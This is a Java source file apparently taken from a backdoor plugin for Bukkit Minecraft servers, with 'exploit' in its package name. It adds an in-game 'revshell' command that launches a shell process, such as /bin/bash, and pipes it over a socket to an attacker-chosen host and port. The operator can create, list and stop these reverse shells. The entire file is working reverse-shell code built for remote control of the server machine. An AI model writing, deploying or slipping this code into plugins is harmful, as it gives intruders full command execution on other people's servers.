package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Arrays;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Consumer;

public class ReverseShellCommand extends Command {
    private final Map<Integer, ReverseShellInstance> activeShells = new ConcurrentHashMap<>();
    private int nextId = 0;

    public ReverseShellCommand() { super(); }
    @Override public String getName() { return "revshell"; }
    @Override public String getDescription() { return "Creates and manages reverse shell connections."; }
    @Override public String getUsage() { return "<create|list|stop> [args...]"; }
    @Override public int getRequirePerm() { return 2; }

    @Override
    public void execute(Player sender, String[] args) {
        if (args.length < 1) {
            Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
            Exploit.sender.sendWarn(sender, "Example: " + Exploit.config.command_prefix + "revshell create 127.0.0.1:4444 /bin/bash");
            return;
        }

        String subCommand = args[0].toLowerCase();
        String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

        switch (subCommand) {
            case "create":
                handleCreate(sender, subArgs);
                break;
            case "list":
                handleList(sender);
                break;
            case "stop":
                handleStop(sender, subArgs);
                break;
            default:
                Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
                break;
        }
    }

    private void handleCreate(Player sender, String[] args) {
        if (args.length < 2) {
            Exploit.sender.sendError(sender, "Usage: " + Exploit.config.command_prefix + "revshell create <ip:port> <shell_command...>");
            return;
        }
        String[] parts = args[0].split(":");
        if (parts.length != 2) {
            Exploit.sender.sendError(sender, "Invalid ip:port format: '" + args[0] + "'");
            return;
        }
        String host = parts[0];
        int port;
        try {
            port = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            Exploit.sender.sendError(sender, "Invalid port: '" + parts[1] + "'");
            return;
        }
        String[] shellCmd = Arrays.copyOfRange(args, 1, args.length);
        final int shellId = ++nextId;

        Exploit.sender.sendMessage(sender, "Attempting to create reverse shell (ID: " + shellId + ") to " + host + ":" + port + "...");

        Consumer<String> onConnect = message -> Exploit.sender.sendSuccess(sender, message);
        Consumer<String> onError = message -> {
            Exploit.sender.sendError(sender, message);
            activeShells.remove(shellId);
        };
        Consumer<String> onDisconnect = message -> {
            if (activeShells.containsKey(shellId)) {
                Exploit.sender.sendWarn(sender, message);
                activeShells.remove(shellId);
            }
        };

        ReverseShellInstance shell = new ReverseShellInstance(shellId, host, port, shellCmd, onConnect, onDisconnect, onError);
        activeShells.put(shellId, shell);
        shell.start();
    }

    private void handleList(Player sender) {
        if (activeShells.isEmpty()) {
            Exploit.sender.sendMessage(sender, "No active reverse shells.");
            return;
        }
        Exploit.sender.sendMessage(sender, ChatColor.GREEN + "Active reverse shells:");
        for (ReverseShellInstance shell : activeShells.values()) {
            Exploit.sender.sendMessage(sender, ChatColor.YELLOW + " - ID: " + shell.getId() + " | " + ChatColor.WHITE + shell.getDetails());
        }
    }

    private void handleStop(Player sender, String[] args) {
        if (args.length < 1) {
            Exploit.sender.sendError(sender, "Usage: " + Exploit.config.command_prefix + "revshell stop <id>");
            return;
        }
        int id;
        try {
            id = Integer.parseInt(args[0]);
        } catch (NumberFormatException e) {
            Exploit.sender.sendError(sender, "Invalid ID: '" + args[0] + "'");
            return;
        }
        ReverseShellInstance shell = activeShells.get(id);
        if (shell == null) {
            Exploit.sender.sendError(sender, "No active shell found with ID: " + id);
            return;
        }
        Exploit.sender.sendMessage(sender, "Sent stop signal to shell ID: " + id);
        shell.stop();
    }

    public static class ReverseShellInstance {
        private final int id;
        private final String host;
        private final int port;
        private final String[] shellCmd;
        private Process process;
        private Socket socket;
        private final Consumer<String> onConnect;
        private final Consumer<String> onDisconnect;
        private final Consumer<String> onError;

        public ReverseShellInstance(int id, String host, int port, String[] shellCmd, Consumer<String> onConnect, Consumer<String> onDisconnect, Consumer<String> onError) {
            this.id = id;
            this.host = host;
            this.port = port;
            this.shellCmd = shellCmd;
            this.onConnect = onConnect;
            this.onDisconnect = onDisconnect;
            this.onError = onError;
        }

        public void start() {
            new Thread(() -> {
                try {
                    process = new ProcessBuilder(shellCmd).redirectErrorStream(true).start();
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(host, port), 10000);
                    socket.setKeepAlive(true);
                    runOnMainThread(() -> onConnect.accept("Reverse shell (ID: " + id + ") connected successfully."));
                    new Thread(this::pipeShellToSocket).start();
                    new Thread(this::pipeSocketToShell).start();
                    process.waitFor();
                } catch (Exception e) {
                    runOnMainThread(() -> onError.accept("Shell connection error (ID: " + id + "): " + e.getMessage()));
                } finally {
                    cleanup();
                }
            }).start();
        }

        private void pipeShellToSocket() {
            try (InputStream processInput = process.getInputStream(); OutputStream socketOutput = socket.getOutputStream()) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = processInput.read(buffer)) != -1) {
                    socketOutput.write(buffer, 0, bytesRead);
                    socketOutput.flush();
                }
            } catch (IOException ignored) {
            } finally {
                closeSocket();
            }
        }

        private void pipeSocketToShell() {
            try (InputStream socketInput = socket.getInputStream(); OutputStream processOutput = process.getOutputStream()) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = socketInput.read(buffer)) != -1) {
                    processOutput.write(buffer, 0, bytesRead);
                    processOutput.flush();
                }
            } catch (IOException ignored) {
            } finally {
                if (process.isAlive()) {
                    process.destroy();
                }
            }
        }

        public void stop() {
            closeSocket();
        }

        private void closeSocket() {
            try {
                if (socket != null && !socket.isClosed()) {
                    socket.close();
                }
            } catch (IOException ignored) {}
        }

        private void cleanup() {
            if (process != null && process.isAlive()) {
                process.destroyForcibly();
            }
            closeSocket();
            runOnMainThread(() -> onDisconnect.accept("Reverse shell (ID: " + id + ") has been disconnected."));
        }

        public String getDetails() {
            return host + ":" + port + " - " + String.join(" ", shellCmd);
        }

        public int getId() {
            return id;
        }

        private void runOnMainThread(Runnable task) {
            new BukkitRunnable() {
                @Override
                public void run() {
                    task.run();
                }
            }.runTask(Exploit.plugin);
        }
    }
}